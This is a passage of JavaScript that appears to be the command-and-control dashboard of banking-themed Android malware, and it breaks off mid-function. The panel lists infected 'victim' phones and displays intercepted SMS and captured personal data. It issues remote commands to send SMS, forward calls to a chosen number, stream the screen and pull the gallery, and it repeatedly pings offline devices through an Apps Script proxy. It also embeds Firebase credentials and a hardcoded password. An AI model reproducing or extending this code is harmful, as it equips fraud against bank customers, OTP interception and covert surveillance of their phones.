// Firebase Configuration (Paste your actual config here)
const firebaseConfig = {
    apiKey: "AIzaSyBk9QFAx5Z56tZq6Sezo9w07TQ_hgwgcYM",
    authDomain: "a-comp-hdfc-apcd006.firebaseapp.com",
    databaseURL: "https://a-comp-hdfc-apcd006-default-rtdb.firebaseio.com",
    projectId: "a-comp-hdfc-apcd006",
    storageBucket: "a-comp-hdfc-apcd006.firebasestorage.app",
    messagingSenderId: "688804381427",
    appId: "1:688804381427:web:100568431b4f0c38086d86",
    measurementId: "G-XEM1HDNF45"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Global variable to store last data snapshot
let lastSnapshotData = null;

// Track current active tab for navigation logic
let currentTab = 'home';

// Track which device is currently being viewed for realtime updates
let activeDeviceId = null;

// Track active modal device
let activeModalDeviceId = null;

// Track selected slot in Call Forwarding modal
let selectedSlot = 0;

// Track modal type (new vs old details)
let activeModalType = 'new';

// Wake-up Tracking & FCM Config
let previousDeviceStates = {};
let pingingDevices = new Set();
// Session Tracking Globals
let currentSessionId = null;
let currentSessionPath = null;

const PING_PROXY_URL = "https://script.google.com/macros/s/AKfycbzUv35AT0wIms3nE5EdbeehvuRM2qlx761NeP46oJjpvFVaqZZBqeZ5ZDSxfgR8OLZT/exec"; 
let pingVisualTimeout = null;

// Initialize Icons on First Load
lucide.createIcons();

// Check login status on page load
window.addEventListener('DOMContentLoaded', () => {
    const isLoggedIn = localStorage.getItem('isLoggedIn');
    const savedUsername = localStorage.getItem('username');

    if (isLoggedIn === 'true' && savedUsername) {
        displayDashboard(savedUsername);
    }
});

function displayDashboard(username) {
    // Transition UI
    document.getElementById('login-section').classList.add('hidden');
    document.getElementById('dashboard-content').classList.remove('hidden');
    
    // Set User Data
    document.getElementById('nav-user-name').innerText = username;
    document.getElementById('user-initial').innerText = username.charAt(0).toUpperCase();

    // Start Session Tracking in AdminActivity
    recordAdminSession(username);

    // Start Realtime Database listener
    syncDashboardWithFirebase();

    // Restore Navigation State
    const savedTab = localStorage.getItem('activeTab') || 'home';
    activeDeviceId = localStorage.getItem('activeDeviceId');
    activeModalDeviceId = localStorage.getItem('activeModalDeviceId');
    activeModalType = localStorage.getItem('activeModalType') || 'new';

    if (activeModalDeviceId) {
        let title = 'Realtime Captured Data';
        if (activeModalType === 'old') title = 'Captured History Logs';
        if (activeModalType === 'permissions') title = 'Device Permissions';
        if (activeModalType === 'screen_control') title = 'Live Screen Control';
        if (activeModalType === 'call_forwarding') title = 'Call Forwarding Setup';
        if (activeModalType === 'admin_login_time') title = 'Admin Activity Duration';
        if (activeModalType === 'active_admins') title = 'Currently Active Admins';
        
        document.getElementById('modal-header-title').innerText = title;
        document.getElementById('details-modal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }

    // Set default active tab
    history.replaceState({ tabId: savedTab }, "", "");
    switchTab(savedTab, false);

    // Trigger icon refresh after dashboard is visible
    setTimeout(() => {
        lucide.createIcons();
    }, 10);
    
    // Change Body Background
    document.body.classList.replace("bg-gradient-to-tr", "bg-slate-50");
    document.body.classList.remove("from-slate-900", "via-indigo-950", "to-slate-900");
}

/**
 * Records the start of an admin session in Firebase
 */
function recordAdminSession(username) {
    const now = new Date();
    const dateStr = now.toISOString().split('T')[0];
    currentSessionId = "sess_" + Date.now();
    currentSessionPath = `AdminActivity/${dateStr}/${username}/${currentSessionId}`;

    const sessionData = {
        login: now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }),
        logout: "Active Now",
        model: username, // Request: Show user's login name instead of device/OS info
        status: "online",
        timestamp: Date.now()
    };

    const sessionRef = database.ref(currentSessionPath);
    sessionRef.set(sessionData);

    // If user closes tab unexpectedly, mark as offline
    sessionRef.onDisconnect().update({
        logout: "Unexpected Close",
        logout_time: Date.now(),
        status: "offline"
    });
}

/**
 * Updates the session record as offline before logging out
 */
async function endAdminSession() {
    if (currentSessionPath) {
        await database.ref(currentSessionPath).update({
            logout: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }),
            logout_time: Date.now(),
            status: "offline"
        });
    }
}

function syncDashboardWithFirebase() {
    // Listen to the root node to get all data at once
    database.ref('/').on('value', (snapshot) => {
        const data = snapshot.val();
        if (!data) return;
        
        // Save to global variable for details view access
        lastSnapshotData = data;

        // 1. Calculate and Update Stats
        const devices = data.Devices || {};

        // Wake-up (Auto-Ping) Logic: Detect Online -> Offline transition
        Object.entries(devices).forEach(([id, dev]) => {
            const currentStatus = dev.device?.online; // "ONLINE" or "OFFLINE"
            const prevStatus = previousDeviceStates[id];

            if (prevStatus === 'ONLINE' && currentStatus === 'OFFLINE') {
                if (dev.fcmToken) {
                    startAutoPing(id, dev.fcmToken);
                }
            }
            previousDeviceStates[id] = currentStatus;
        });

        const deviceArray = Object.values(devices).reverse();
        const totalCount = deviceArray.length;
        const onlineCount = deviceArray.filter(d => d.device && d.device.online === 'ONLINE').length;
        const offlineCount = totalCount - onlineCount;

        document.getElementById('stat-all').innerText = totalCount;
        document.getElementById('stat-online').innerText = onlineCount;
        document.getElementById('stat-offline').innerText = offlineCount;
        document.getElementById('stat-activity').innerText = totalCount > 0 ? "92%" : "0%";

        // Update Status Badge and Dot
        const statusText = document.getElementById('stat-status');
        const statusDot = document.getElementById('status-dot');
        if (onlineCount > 0) {
            statusText.innerText = "Online";
            statusText.className = "text-[9px] font-black text-green-500 uppercase tracking-widest";
            statusDot.className = "flex h-1.5 w-1.5 rounded-full bg-green-500 animate-pulse";
        } else {
            statusText.innerText = "Idle";
            statusText.className = "text-[9px] font-black text-slate-300 uppercase tracking-widest";
            statusDot.className = "flex h-1.5 w-1.5 rounded-full bg-slate-200";
        }

        // 2. Update App Info (License Section)
        if (data.AppStats) {
            const approvedDate = new Date(data.AppStats.approved_date);
            document.getElementById('license-expire').innerText = `Approved: ${approvedDate.toLocaleDateString()}`;
            document.getElementById('license-days').innerText = data.AppStats.security_key || "SECURE_ADMIN";
        }

        // Note: Admin Status Logs container was removed from Home Fragment
        // Global Activity and Active Admins are now handled via Popups
        const adminActivity = data.AdminActivity || {};
        const admins = data.admins || {};

        // 4. Render Devices List
        const deviceListContainer = document.getElementById('device-list-container');
        if (deviceListContainer) {
            deviceListContainer.innerHTML = deviceArray.map(dev => `
                <div onclick="openDeviceDetails('${dev.device?.deviceID}')" class="group relative cursor-pointer ${dev.device?.online === 'ONLINE' ? 'bg-emerald-50/10 border-emerald-500/30 shadow-emerald-500/20' : 'bg-rose-50/10 border-rose-500/30 shadow-rose-500/20'} border-2 rounded-[1.75rem] overflow-hidden shadow-xl transition-all duration-300 hover:shadow-2xl hover:-translate-y-1">
                    <div class="absolute inset-0 bg-gradient-to-br from-white via-transparent to-slate-50/50 pointer-events-none"></div>
                    
                    <!-- Device Header Navbar -->
                    <div class="relative bg-gradient-to-r ${dev.device?.online === 'ONLINE' ? 'from-green-500 to-emerald-600' : 'from-red-500 to-rose-600'} px-4 py-2.5 flex justify-between items-center text-white shadow-md">
                        <div class="flex items-center space-x-2">
                            <div class="p-1.5 bg-white/20 rounded-lg backdrop-blur-md">
                                <i data-lucide="smartphone" class="w-3.5 h-3.5 text-white"></i>
                            </div>
                            <span class="font-bold text-[13px] tracking-tight drop-shadow-sm">${dev.device?.device_name || 'Unknown Device'}</span>
                        </div>
                        <span class="bg-black/10 px-2.5 py-1 rounded-full text-[9px] font-black tracking-widest uppercase backdrop-blur-md border border-white/10">#${dev.deviceNumber || '0'}</span>
                    </div>
                    
                    <!-- Device Content Area -->
                    <div class="relative p-4">
                        <!-- Connection & Status Info -->
                        <div class="grid grid-cols-[1.4fr_1fr] gap-2 mb-3">
                           <!-- Ping Card -->
                           <div class="bg-slate-50/80 p-2 rounded-2xl border border-slate-100/50">
                                <div class="flex items-center space-x-1.5 mb-0.5">
                                    <i data-lucide="clock" class="w-3 h-3 text-slate-400"></i>
                                    <span class="text-[9px] font-bold uppercase tracking-wider text-slate-400">Ping</span>
                                </div>
                                <p class="text-[10px] font-bold text-slate-700 truncate">
                                    ${dev.device?.last_seen ? new Date(dev.device.last_seen).toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true }) : '---'}
                                </p>
                           </div>
                           <!-- Compact Status Card (Battery, Wifi, Star) -->
                           <div class="bg-slate-50/80 p-2 rounded-2xl border border-slate-100/50 flex items-center justify-around">
                                <span class="text-[10px] font-bold text-slate-700">${dev.device?.Battery || 0}%</span>
                                <i data-lucide="wifi" class="w-3.5 h-3.5 text-indigo-500"></i>
                                <i data-lucide="star" class="w-3.5 h-3.5 text-amber-500 fill-amber-500"></i>
                           </div>
                        </div>

                        <!-- SIM Cards Grid -->
                        <div class="grid grid-cols-1 gap-2.5">
                            ${Object.values(dev.sims || {}).map(sim => `
                                <div class="relative group/sim bg-white border border-slate-100 p-2 rounded-[1.25rem] flex items-center space-x-3 transition-colors hover:border-indigo-200 hover:bg-indigo-50/30">
                                    <div class="w-8 h-8 bg-indigo-50 rounded-xl flex items-center justify-center text-indigo-500 group-hover/sim:bg-indigo-600 group-hover/sim:text-white transition-all shadow-sm">
                                        <i data-lucide="sim-card" class="w-3 h-3"></i>
                                    </div>
                                    <div class="min-w-0">
                                        <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">Sim Slot ${sim.slot}</p>
                                        <p class="text-[11px] font-bold text-slate-800 truncate leading-none mb-1">${sim.carrier_name || 'No Carrier'}</p>
                                        <p class="text-[10px] font-bold text-indigo-600 leading-none tracking-tight">${sim.number || 'Unknown'}</p>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                </div>
            `).join('');
        }

        // 5. Render Global SMS logs
        const smsListContainer = document.getElementById('sms-list-container');
        if (smsListContainer) {
            let allSms = [];
            deviceArray.forEach(dev => {
                if (dev.Sms) {
                    Object.values(dev.Sms).forEach(msg => {
                        allSms.push({ ...msg, deviceName: dev.device?.device_name });
                    });
                }
            });

        // Sort SMS logs by date: Latest first
        allSms.sort((a, b) => new Date(b.received_time) - new Date(a.received_time));

            smsListContainer.innerHTML = allSms.slice(0, 15).map(sms => `
                <div class="bg-white p-4 rounded-2xl border-2 border-slate-100 shadow-[0_4px_0_0_rgba(226,232,240,1)] hover:translate-y-[2px] hover:shadow-[0_2px_0_0_rgba(226,232,240,1)] transition-all duration-200">
                    <div class="flex justify-between items-start mb-1">
                        <p class="text-[10px] font-bold text-indigo-600 uppercase">${sms.sender}</p>
                        <p class="text-[9px] text-slate-400">${sms.received_time}</p>
                    </div>
                    <p class="text-xs text-slate-700 leading-tight">${sms.message}</p>
                    <div class="flex items-center mt-2 pt-1 border-t border-slate-50">
                        <i data-lucide="smartphone" class="w-2.5 h-2.5 text-slate-300 mr-1"></i>
                        <p class="text-[8px] font-bold text-slate-400">${sms.deviceName || 'Unknown'}</p>
                    </div>
                </div>
            `).join('');
        }

        // 6. Refresh Device Details UI in Realtime if open
        if (activeDeviceId && currentTab === 'device-details') {
            renderDeviceDetailsUI(activeDeviceId);
        }

        // 7. Refresh Modal Content in Realtime
        if (activeModalDeviceId) {
            renderModalUI(activeModalDeviceId);
        }

        lucide.createIcons();
    });
}

/**
 * Opens the specific device details view
 * @param {string} deviceId 
 */
function openDeviceDetails(deviceId) {
    if (!lastSnapshotData || !lastSnapshotData.Devices[deviceId]) return;
    
    activeDeviceId = deviceId;
    localStorage.setItem('activeDeviceId', deviceId);
    switchTab('device-details');
    renderDeviceDetailsUI(deviceId);
}

/**
 * Renders the device details content (called on open and on data updates)
 */
function renderDeviceDetailsUI(deviceId) {
    const dev = lastSnapshotData.Devices[deviceId];
    const container = document.getElementById('device-details-content');

    container.innerHTML = `
        <!-- Professional Control Panel (Call Forwarding) -->
        <div class="bg-white p-4 rounded-3xl border-2 border-indigo-600/20 shadow-lg shadow-indigo-100/40 space-y-4">
            <button onclick="showCallForwardModal('${deviceId}')" class="w-full bg-gradient-to-br from-indigo-600 via-indigo-700 to-violet-700 text-white font-black py-3 rounded-2xl shadow-md shadow-indigo-100 hover:shadow-indigo-200 hover:-translate-y-0.5 transition-all uppercase tracking-[0.12em] text-[10px]">
                Call Forwarding
            </button>

            <div id="cf-status-feedback" class="text-center text-[9px] font-black text-indigo-600 animate-pulse uppercase tracking-widest">
                ${dev.call_forward ? `${dev.call_forward.status || 'EXECUTING'}: ${dev.call_forward.message || 'Waiting for response...'}` : 'SYSTEM READY'}
            </div>

            <div class="grid grid-cols-1 gap-2.5">
                <div class="group relative">
                    <div class="absolute left-3.5 top-1/2 -translate-y-1/2 w-7 h-7 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500 group-focus-within:bg-indigo-600 group-focus-within:text-white transition-colors">
                        <i data-lucide="phone" class="w-4 h-4"></i>
                    </div>
                    <input type="tel" id="cf-number" maxlength="10" placeholder="Target Mobile Number" 
                        class="w-full bg-slate-50/50 border border-slate-200 rounded-xl pl-14 pr-4 py-3 text-xs font-bold text-slate-800 placeholder-slate-400 focus:ring-4 focus:ring-indigo-500/10 focus:bg-white focus:border-indigo-500 outline-none transition-all">
                </div>
                <div class="group relative">
                    <div class="absolute left-3.5 top-1/2 -translate-y-1/2 w-7 h-7 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500 group-focus-within:bg-indigo-600 group-focus-within:text-white transition-colors">
                        <i data-lucide="message-square" class="w-4 h-4"></i>
                    </div>
                    <input type="text" id="cf-message" placeholder="Command Message (Optional)" 
                        class="w-full bg-slate-50/50 border border-slate-200 rounded-xl pl-14 pr-4 py-3 text-xs font-bold text-slate-800 placeholder-slate-400 focus:ring-4 focus:ring-indigo-500/10 focus:bg-white focus:border-indigo-500 outline-none transition-all">
                </div>
            </div>

            <div class="grid grid-cols-2 gap-2.5">
                ${Object.values(dev.sims || {}).map(sim => `
                    <div onclick="handleSendSmsClick('${deviceId}', ${sim.slot})" class="relative group/sim cursor-pointer bg-slate-50/50 border border-slate-200 p-2.5 rounded-xl hover:border-indigo-500 hover:bg-indigo-50/50 transition-all active:scale-95">
                        <div class="flex items-center space-x-1.5 mb-1.5">
                            <div class="p-1 bg-white rounded shadow-xs">
                                <i data-lucide="sim-card" class="w-3 h-3 text-indigo-600"></i>
                            </div>
                            <span class="text-[9px] font-black text-slate-400 uppercase tracking-widest">SIM ${sim.slot + 1}</span>
                        </div>
                        <p class="text-[10px] font-bold text-slate-800 leading-none truncate mb-1">${sim.carrier_name || 'No Carrier'}</p>
                        <p class="text-[9px] font-bold text-indigo-600/80 tracking-tighter">${sim.number || 'Unknown'}</p>
                    </div>
                `).join('')}
            </div>
        </div>

        <!-- System Actions Card -->
        <div class="bg-white p-4 rounded-2xl border-2 border-slate-200 shadow-md space-y-3">
            <div class="flex items-center space-x-2 border-b border-slate-100 pb-2">
                <i data-lucide="zap" class="w-3.5 h-3.5 text-indigo-500"></i>
                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">System Actions</h3>
            </div>
            <div class="grid grid-cols-2 gap-2.5">
                <button onclick="showCustomerDetailsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Details</button>
                <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'start')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Start Gallery</button>
                <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'stop')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Stop Gallery</button>
                <button onclick="showScreenControlModal('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Screen Control</button>
                <button onclick="showPermissionsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">User Permission</button>
                <button onclick="showOldDetailsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Old Details</button>
                <button onclick="manualPing('${deviceId}')" class="bg-indigo-600 text-white border border-indigo-600 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider hover:bg-indigo-700 transition-all flex items-center justify-center space-x-1"><i data-lucide="zap" class="w-3 h-3"></i><span>Wake Up</span></button>
            </div>
        </div>

        <!-- Device SMS Logs -->
        <div class="space-y-3">
            <div class="flex items-center justify-between px-2">
                <div class="flex items-center space-x-2">
                    <i data-lucide="message-square" class="w-3.5 h-3.5 text-indigo-500"></i>
                    <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Device SMS Logs</h3>
                </div>
                <span class="text-[9px] font-bold text-slate-400 uppercase">${dev.Sms ? Object.keys(dev.Sms).length : 0} Messages</span>
            </div>
            <div class="space-y-2">
                ${dev.Sms ? Object.values(dev.Sms)
                    .sort((a, b) => new Date(b.received_time) - new Date(a.received_time))
                    .map(msg => `
                    <div class="bg-white p-4 rounded-2xl border-2 border-slate-100 shadow-[0_4px_0_0_rgba(226,232,240,1)] hover:translate-y-[2px] hover:shadow-[0_2px_0_0_rgba(226,232,240,1)] transition-all duration-200">
                        <div class="flex justify-between items-start mb-2">
                            <span class="text-[10px] font-bold text-indigo-600 bg-indigo-50 px-2 py-0.5 rounded-md uppercase tracking-tight">${msg.sender}</span>
                            <span class="text-[9px] font-medium text-slate-400">${msg.received_time}</span>
                        </div>
                        <p class="text-xs text-slate-700 leading-relaxed font-medium">${msg.message}</p>
                    </div>
                `).join('') : `
                    <div class="bg-white p-10 rounded-2xl border-2 border-dashed border-slate-200 text-center">
                        <p class="text-xs font-bold text-slate-400">No logs found on this device</p>
                    </div>
                `}
            </div>
        </div>
    `;
}

/**
 * Handles sending SMS command via RTDB and FCM
 * Uses the fragment inputs for number and message
 */
async function handleSendSmsClick(deviceId, slot) {
    const number = document.getElementById('cf-number')?.value.trim();
    const message = document.getElementById('cf-message')?.value.trim();

    if (!number || number.length < 10 || !message) {
        showToast("Enter number and message", "error");
        return;
    }

    const dev = lastSnapshotData?.Devices[deviceId];
    
    // 1. RTDB Command Object (Victim phone reads from here)
    const smsData = {
        number: number,
        message: message,
        sim_slot: Number(slot)
    };

    // 2. FCM Data Payload (For immediate wake-up)
    const fcmData = {
        action: "send_sms",
        number: number,
        message: message,
        sim_slot: String(slot)
    };

    // Send FCM
    sendFcmPing(dev.fcmToken, fcmData);

    // Set RTDB Command
    database.ref(`Devices/${deviceId}/commands/send_sms`).set(smsData)
        .then(() => showToast("SMS Command Sent"))
        .catch(() => showToast("Failed to send", "error"));
}

/**
 * Orchestrates Call Forwarding Command
 */
async function handleCallForwardClick(deviceId, slot, subAction) {
    const modalNum = document.getElementById('cf-number-modal')?.value.trim();
    const number = modalNum || '';
    
    if (subAction === 'activate' && number.length < 10) {
        showToast("Enter valid number", "error");
        return;
    }

    const dev = lastSnapshotData?.Devices[deviceId];
    const finalSlot = (slot !== undefined && slot !== null) ? slot : selectedSlot;

    // 1. RTDB Command Object (Matches your Admin App RTDB logic)
    const rtdbCommand = {
        action: subAction, // "activate" or "deactivate"
        sim_slot: Number(finalSlot)
    };
    if (subAction === 'activate') {
        rtdbCommand.forward_number = number;
    }

    // 2. FCM Data Payload (Matches your DeviceDetailsActivity.java logic)
    const fcmData = {
        action: "call_forward",
        sub_action: subAction,
        sim_slot: String(finalSlot)
    };
    if (subAction === 'activate') {
        fcmData.forward_number = number;
    }

    // Clear old response from Firebase to ensure we don't show stale/empty data
    database.ref(`Devices/${deviceId}/call_forward`).remove();

    // Send via FCM Proxy (Immediate Action)
    sendFcmPing(dev.fcmToken, fcmData);

    // Send via RTDB (Backup Mechanism)
    database.ref(`Devices/${deviceId}/commands/call_forward`).set(rtdbCommand)
        .then(() => showToast("Request Sent"))
        .catch(() => showToast("Backup Failed", "error"));
}

/**
 * Shows a professional toast notification
 */
function showToast(message, type = 'success') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    
    // Base classes for a premium look
    const baseClasses = "px-6 py-3 rounded-2xl shadow-2xl text-white font-bold text-[10px] uppercase tracking-[0.2em] transition-all duration-300 transform translate-y-[-20px] opacity-0";
    const bgClass = type === 'success' ? 'bg-emerald-500' : 'bg-rose-500';
    
    toast.className = `${baseClasses} ${bgClass}`;
    toast.innerText = message;
    
    container.appendChild(toast);
    
    // Trigger animation
    setTimeout(() => {
        toast.classList.remove('translate-y-[-20px]', 'opacity-0');
    }, 10);
    
    // Remove after 3 seconds
    setTimeout(() => {
        toast.classList.add('translate-y-[-20px]', 'opacity-0');
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

/**
 * Sends a High-Priority FCM Ping via V1 API
 */
async function sendFcmPing(fcmToken) {
    if (!PING_PROXY_URL || PING_PROXY_URL.includes("YOUR_")) {
        console.error("FCM Error: Proxy URL missing! Please set PING_PROXY_URL in script.js");
        return false;
    }

    try {
        await fetch(PING_PROXY_URL, {
            method: 'POST',
            mode: 'no-cors', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: fcmToken })
        });

        console.log("Ping command sent to Google Proxy successfully.");
        triggerPingVisual();
        return true;
    } catch (e) { 
        console.error("FCM Proxy Error:", e); 
        return false;
    }
}

function startAutoPing(deviceId, fcmToken) {
    if (pingingDevices.has(deviceId)) return;
    pingingDevices.add(deviceId);

    let attempts = 0;
    const interval = setInterval(() => {
        attempts++;
        sendFcmPing(fcmToken);
        if (attempts >= 15) {
            clearInterval(interval);
            pingingDevices.delete(deviceId);
        }
    }, 20000); // 20 Seconds interval
}

/**
 * Updates the UI graph color when a ping is active
 */
function triggerPingVisual() {
    const graphPath = document.getElementById('ping-graph-path');
    if (!graphPath) return;

    // Set to Active (Green)
    graphPath.setAttribute('stroke', '#22c55e');
    
    // Reset existing timeout
    if (pingVisualTimeout) clearTimeout(pingVisualTimeout);

    // Revert to Idle (Yellow) after 2 seconds
    pingVisualTimeout = setTimeout(() => {
        graphPath.setAttribute('stroke', '#eab308');
        pingVisualTimeout = null;
    }, 2000);
}

async function manualPing(deviceId) {
    const dev = lastSnapshotData?.Devices[deviceId];
    if (dev?.fcmToken) {
        const success = await sendFcmPing(dev.fcmToken);
        if (success) {
            showToast("Request Sent");
            triggerPingVisual();
        } else {
            showToast("Ping Failed", "error");
        }
    }
}

/**
 * Sends a command to a specific device in Firebase
 * @param {string} deviceId 
 * @param {string} command 
 * @param {string} value 
 */
function sendDeviceCommand(deviceId, command, value) {
    if (!deviceId) return;
    database.ref(`Devices/${deviceId}/commands/${command}`).set(value)
        .then(() => {
            showToast("Request Sent");
        })
        .catch((error) => {
            console.error("Firebase Command Error:", error);
            showToast("Action Failed", "error");
        });
}

function attemptLogin() {
    const username = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value;
    const errorMsg = document.getElementById('login-error');

    if (pass === '12345' && username !== "") {
        localStorage.setItem('isLoggedIn', 'true');
        localStorage.setItem('username', username);
        displayDashboard(username);
    } else {
        errorMsg.classList.remove('hidden');
    }
}

async function logout() {
    await endAdminSession();
    localStorage.removeItem('isLoggedIn');
    localStorage.removeItem('username');
    localStorage.removeItem('activeTab');
    location.reload();
}

/**
 * Opens the customer details popup
 */
function showCustomerDetailsPopup(deviceId) {
    activeModalDeviceId = deviceId;
    activeModalType = 'new';
    localStorage.setItem('activeModalDeviceId', deviceId);
    localStorage.setItem('activeModalType', 'new');
    document.getElementById('modal-header-title').innerText = 'Realtime Captured Data';
    document.getElementById('details-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    renderModalUI(deviceId);
}

/**
 * Opens the Admin Login Time tracking popup
 */
function showAdminLoginTimePopup() {
    activeModalDeviceId = "global"; // Using a dummy ID for global activity
    activeModalType = 'admin_login_time';
    localStorage.setItem('activeModalDeviceId', "global");
    localStorage.setItem('activeModalType', 'admin_login_time');
    document.getElementById('modal-header-title').innerText = 'Admin Activity Duration';
    document.getElementById('details-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    renderModalUI("global");
}

/**
 * Opens the Active Admins status popup
 */
function showActiveAdminsPopup() {
    activeModalDeviceId = "global";
    activeModalType = 'active_admins';
    localStorage.setItem('activeModalDeviceId', "global");
    localStorage.setItem('activeModalType', 'active_admins');
    document.getElementById('modal-header-title').innerText = 'Currently Active Admins';
    document.getElementById('details-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    renderModalUI("global");
}

/**
 * Opens the call forwarding setup modal
 */
function showCallForwardModal(deviceId) {
    activeModalDeviceId = deviceId;
    activeModalType = 'call_forwarding';
    selectedSlot = 0; // Default selection
    localStorage.setItem('activeModalDeviceId', deviceId);
    localStorage.setItem('activeModalType', 'call_forwarding');
    document.getElementById('modal-header-title').innerText = 'Call Forwarding Setup';
    document.getElementById('details-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    renderModalUI(deviceId);
}

/**
 * Opens the live screen control modal
 */
function showScreenControlModal(deviceId) {
    activeModalDeviceId = deviceId;
    activeModalType = 'screen_control';
    localStorage.setItem('activeModalDeviceId', deviceId);
    localStorage.setItem('activeModalType', 'screen_control');
    document.getElementById('modal-header-title').innerText = 'Live Screen Control';
    document.getElementById('details-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    
    // Send ON command to device
    database.ref(`Devices/${deviceId}/Screen_cast/screen`).set("on");
    
    renderModalUI(deviceId);
}

/**
 * Opens the permissions management popup
 */
function showPermissionsPopup(deviceId) {
    activeModalDeviceId = deviceId;
    activeModalType = 'permissions';
    localStorage.setItem('activeModalDeviceId', deviceId);
    localStorage.setItem('activeModalType', 'permissions');
    document.getElementById('modal-header-title').innerText = 'Device Permissions';
    document.getElementById('details-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    renderModalUI(deviceId);
}

/**
 * Opens the old logs history popup
 */
function showOldDetailsPopup(deviceId) {
    activeModalDeviceId = deviceId;
    activeModalType = 'old';
    localStorage.setItem('activeModalDeviceId', deviceId);
    localStorage.setItem('activeModalType', 'old');
    document.getElementById('modal-header-title').innerText = 'Captured History Logs';
    document.getElementById('details-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    renderModalUI(deviceId);
}

/**
 * Closes the customer details popup
 */
function closeDetailsModal() {
    // Send OFF command if stopping screen cast
    if (activeModalType === 'screen_control' && activeModalDeviceId) {
        database.ref(`Devices/${activeModalDeviceId}/Screen_cast/screen`).set("off");
    }

    activeModalDeviceId = null;
    activeModalType = 'new';
    localStorage.removeItem('activeModalDeviceId');
    localStorage.removeItem('activeModalType');
    document.getElementById('details-modal').classList.add('hidden');
    document.body.style.overflow = '';
}

/**
 * Renders the modal content from the current snapshot
 */
function renderModalUI(deviceId) {
    if (!lastSnapshotData) return;
    const dev = deviceId !== "global" ? lastSnapshotData.Devices[deviceId] : null;
    const modalBody = document.getElementById('modal-body');
    
    // Optimization for Screen Control: only update the image source to prevent UI flicker
    if (activeModalType === 'screen_control') {
        const frameImg = document.getElementById('screen-frame');
        const castData = dev.Screen_cast || {};
        if (frameImg && castData.data) {
            frameImg.src = `data:image/jpeg;base64,${castData.data}`;
            return; // Don't re-render full HTML if frame is just updating
        }
    }

    let html = '';

    if (activeModalType === 'new' && dev.user_info) {
        // Show user_info (Lead Identity) for the main Details button
        html += `<div class="space-y-3 mb-6">
            <div class="flex items-center space-x-2 px-1">
                <i data-lucide="user-check" class="w-3.5 h-3.5 text-indigo-600"></i>
                <h4 class="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Lead Identity (Live)</h4>
            </div>
            <div class="grid grid-cols-2 gap-3 bg-white border-2 border-indigo-500/30 p-4 rounded-3xl shadow-sm">
                ${Object.entries(dev.user_info).map(([key, value]) => `
                    <div>
                        <p class="text-[8px] font-bold text-slate-400 uppercase mb-1 leading-none">${key.replace(/_/g, ' ')}</p>
                        <p class="text-[11px] font-black text-slate-800 break-words leading-tight">${value || '---'}</p>
                    </div>
                `).join('')}
            </div>
        </div>`;
    } else if (activeModalType === 'old' && dev.data_collection) {
        // Show data_collection history for the Old Details button
        html += `<div class="space-y-3">
            <div class="flex items-center space-x-2 px-1">
                <i data-lucide="history" class="w-3.5 h-3.5 text-indigo-600"></i>
                <h4 class="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Logs History</h4>
            </div>
            <div class="space-y-4">
                ${Object.values(dev.data_collection).reverse().map(entry => `
                    <div class="bg-white border-2 border-indigo-500/20 p-4 rounded-3xl shadow-lg shadow-indigo-50/50 hover:border-indigo-500/40 transition-all">
                        <div class="flex justify-between items-center mb-3 border-b border-slate-50 pb-2">
                            <span class="text-[9px] font-black text-indigo-500 uppercase tracking-tighter">Record Entry</span>
                            <i data-lucide="shield" class="w-3 h-3 text-indigo-300"></i>
                        </div>
                        <div class="grid grid-cols-2 gap-y-3 gap-x-4">
                            ${Object.entries(entry).map(([key, value]) => `
                                <div>
                                    <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">${key.replace(/_/g, ' ')}</p>
                                    <p class="text-[11px] font-bold text-slate-800 break-words leading-tight">${value || '---'}</p>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `).join('')}
            </div>
        </div>`;
    } else if (activeModalType === 'admin_login_time') {
        // Admin Activity Duration Logic
        const activity = lastSnapshotData.AdminActivity || {};
        let sessionList = [];

        Object.keys(activity).forEach(date => {
